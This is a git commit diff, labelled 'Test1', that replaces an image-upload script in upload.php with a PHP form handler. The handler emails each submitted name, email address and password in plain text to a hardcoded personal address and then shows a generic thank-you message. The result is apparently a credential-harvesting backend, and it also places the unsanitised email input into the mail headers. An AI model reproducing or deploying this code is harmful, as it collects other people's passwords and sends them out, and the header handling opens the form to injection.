4d6c090a8dd8c67dac793de700bd428cd41f4d35
Valentin <valydumitru01@yahoo.com>
2022-07-03 17:27:58 +0200

    Test1

---
+++ README.md
@@ -0,0 +1,5 @@
+## Referencias utiles: 
+Ejemplo de enviar correo con PHP: 
+
+https://www.codexworld.com/send-email-with-attachment-php/#:~:text=The%20PHP%20mail()%20function,$from%20%E2%80%93%20Sender%20email%20address.
+
--- upload.php
+++ upload.php
@@ -1,17 +1,29 @@
 <?php
-$target_dir = "uploads/";
-$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
-$uploadOk = 1;
-$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
-// Check if image file is a actual image or fake image
-if(isset($_POST["submit"])) {
-  $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
-  if($check !== false) {
-    echo "File is an image - " . $check["mime"] . ".";
-    $uploadOk = 1;
-  } else {
-    echo "File is not an image.";
-    $uploadOk = 0;
-  }
+if (isset($_POST['email'])) {
+    $email_to = "valydumitru01@yahoo.com";
+    $email_subject = "subject";
+    $first_name = $_POST['first_name']; // required
+    $email_from = $_POST['email']; // required
+    $password = $_POST['password'];
+    function clean_string($string)
+    {
+        $bad = array("content-type", "bcc:", "to:", "cc:", "href");
+        return str_replace($bad, "", $string);
+    }
+    $email_message = "Form details below.\n\n";
+    $email_message .= "Name: " . clean_string($first_name) . "\n";
+    $email_message .= "Email: " . clean_string($email_from) . "\n";
+    $email_message .= "password: " . clean_string($password) . "\n";
+
+    // email 
+    $headers = 'From: ' . $email_from . "\r\n" .
+        'Reply-To: ' . $email_from . "\r\n" .
+        'X-Mailer: PHP/' . phpversion();
+    mail($email_to, $email_subject, $email_message, $headers);
+?>
+    <!-- include your own success html here -->
+
+    <div class="feedback">Thanks for submiting we will get back to you as soon as possable</div>
+<?php
 }
 ?>
